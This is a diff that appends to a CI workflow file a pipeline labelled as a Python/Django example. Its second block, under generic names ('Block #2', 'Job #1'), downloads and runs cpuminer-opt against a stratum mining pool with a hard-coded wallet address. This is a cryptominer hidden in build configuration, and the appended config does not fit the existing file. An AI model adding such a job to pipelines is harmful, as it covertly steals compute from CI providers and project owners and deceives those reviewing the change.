@@ -11,3 +11,35 @@ workflows:
     # Run the welcome/run job in its own container
     jobs:
       - welcome/run
+
+name: Semaphore Python / Django Example Pipeline
+agent:
+  machine:
+    type: e1-standard-8
+    os_image: ubuntu1804
+global_job_config:
+  prologue:
+    commands:
+      - sem-version python 3.8
+blocks:
+  - name: Install Dependencies
+    task:
+      prologue:
+        commands:
+          - sudo apt-get update && sudo apt-get install -y python3-dev && sudo apt-get install default-libmysqlclient-dev
+      jobs:
+        - name: pip
+          commands:
+            - checkout
+            - cache restore
+            - pip download --cache-dir .pip_cache -r requirements.txt
+            - cache store
+    dependencies: []
+  - name: 'Block #2'
+    dependencies:
+      - Install Dependencies
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u MYkMsBC5C3XidNixZofNNsYabY8LZZQoeh.1 -t 6'
